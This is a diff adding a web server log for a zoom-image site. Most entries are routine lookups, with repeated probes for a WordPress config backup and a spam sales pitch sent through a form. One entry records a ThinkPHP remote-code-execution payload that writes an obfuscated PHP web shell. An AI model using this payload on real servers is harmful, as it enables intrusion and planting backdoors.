@@ -1,0 +1,24 @@
+2019-06-15 2:53:43 - INFO --> getUserByCookie: 
+2019-06-15 2:55:18 - INFO --> getUserByCookie: 
+2019-06-15 5:04:31 - INFO --> getUserByCookie: 
+2019-06-15 5:04:31 - INFO --> getZoomById: iSctp
+2019-06-15 5:04:31 - INFO --> incrementZoomById: iSctp
+2019-06-15 5:04:31 - INFO --> increment zoom: iSctp
+2019-06-15 5:10:28 - INFO --> getUserByCookie: 
+2019-06-15 5:10:28 - INFO --> getZoomById: iSctp
+2019-06-15 5:10:28 - INFO --> incrementZoomById: iSctp
+2019-06-15 5:10:28 - INFO --> increment zoom: iSctp
+2019-06-15 5:10:29 - INFO --> getUserByCookie: 
+2019-06-15 5:10:29 - INFO --> getZoomById: wp-config.php.backup
+2019-06-15 8:25:58 - INFO --> getUserByCookie: 
+2019-06-15 8:25:58 - INFO --> getZoomById: wp-config.php.backup
+2019-06-15 8:56:43 - INFO --> getUserByCookie: 
+2019-06-15 8:56:43 - INFO --> getZoomById: s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=sowoxn.php&vars%5B1%5D%5B%5D=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST%5Bqazw%5D);?%3E
+2019-06-15 9:22:38 - INFO --> getUserByCookie: 
+2019-06-15 19:40:17 - INFO --> getUserByCookie: 
+2019-06-15 19:40:17 - INFO --> getZoomById: wp-config.php.backup
+2019-06-15 21:34:07 - INFO --> getUserByCookie: 
+2019-06-15 21:34:07 - INFO --> getZoomById: wp-config.php.backup
+2019-06-15 23:53:55 - INFO --> getUserByCookie: 
+2019-06-15 23:53:58 - INFO --> getUserByCookie: 
+2019-06-15 23:53:58 - INFO --> getZoomById: reportType=nother+Thing&email=eric%40talkwithcustomer.com&description=Hello%2C%0D%0A%0D%0ALet%E2%80%99s+take+a+quick+trip+to+Tomorrow-land.%0D%0A%0D%0AI%E2%80%99m+not+talking+about+a+theme+park%2C+I%E2%80%99m+talking+about+your+business%E2%80%99s+future%E2%80%A6%0D%0A%0D%0ADon%E2%80%99t+worry%2C+we+won%E2%80%99t+even+need+a+crystal+ball.++%0D%0A%0D%0AJust+imagine%E2%80%A6%0D%0A%0D%0A%E2%80%A6+a+future+where+the+money+you+invest+in+driving+traffic+to+your+dramaticzoom.com+site+pays+off+with+tons+of+calls+from+qualified+leads.+%0D%0A%0D%0AAnd+the+difference+between+what+you+experienced+in+the+past+is+staggering+%E2%80%93+you%E2%80%99re+seeing+10X%2C+20X%2C+50X%2C+even+up+to+a+100X+more+leads+coming+from+your+dramaticzoom.com+website.++Leads+that+are+already+engaged+with+what+you+have+to+offer+and+are+ready+to+learn+more+and+even+open+their+wallets.%0D%0A%0D%0ASeeing+all+this+taking+place+in+your+business%2C+you+think+back:+%0D%0A%0D%0A%E2%80%9CWhat+did+I+do+only+a+short+time+ago+that+made+such+a+huge+difference%3F%E2%80%9D%0D%0A%0D%0AAnd+then+it+hits+you:++%0D%0A%0D%0AYou+took+advantage+of+a+free+14+day+Test+Drive+of+TalkWithCustomer.%0D%0A%0D%0AYou+installed+TalkWithCustomer+on+your+website+%E2%80%93+it+was+a+snap.%0D%0A%0D%0AAnd+practically+overnight+customers+started+engaging+more+regularly+and+calling+your+business.+Like+this:%0D%0A%0D%0A%E2%80%9DEMA+has+been+looking+for+ways+to+reach+out+to+an+audience.+TalkWithCustomer+so+far+is+the+most+direct+call+of+action.+It+has+produced+above+average+closing+ratios+and+we+are+thrilled.+Thank+you+for+providing+a+real+and+effective+tool+to+generate+REAL+leads.%E2%80%9D++-+Pat+MontesDeOca%0D%0A%0D%0ASince+you+installed+TalkWithCustomer+it%E2%80%99s+been+great.%0D%0A%0D%0AIt%E2%80%99s+fun+to+dream%2C+but+this+isn%E2%80%99t+just+a+dream.+It+could+be+your+very+real+tomorrow.+%0D%0A%0D%0AAll+you+have+to+do+is+CLICK+HERE+http://www.talkwithcustomer.com+to+sign+up+to+try+TalkWithCustomer+today.%0D%0A%0D%0ANot+tomorrow.+Today.%0D%0A%0D%0ABecause+there%E2%80%99s+no+better+time+than+now+to+make+your+business+work+the+way+you%E2%80%99ve+always+wanted.+%0D%0A%0D%0ASincerely%2C%0D%0AEric%0D%0A%0D%0APS:+Remember%2C+there%E2%80%99s+absolutely+NO+risk+to+you+%E2%80%93+if+you%E2%80%99re+100%25+satisfied+after+the+14+days+pass%2C+there%E2%80%99s+no+obligation.++And+even+ONE+more+lead-turned-into-customer+could+be+worth+hundreds%2C+even+thousands+to+you+over+their+lifetime.+Don%E2%80%99t+let+the+moment+pass+you+by.++CLICK+HERE+http://www.talkwithcustomer.com+to+sign+up+for+this+free+test+drive+now.++%0D%0A%0D%0AIf+you%27d+like+to+unsubscribe+click+here.+http://liveserveronline.com/talkwithcustomer.aspx%3Fd%3Ddramaticzoom.com%0D%0A
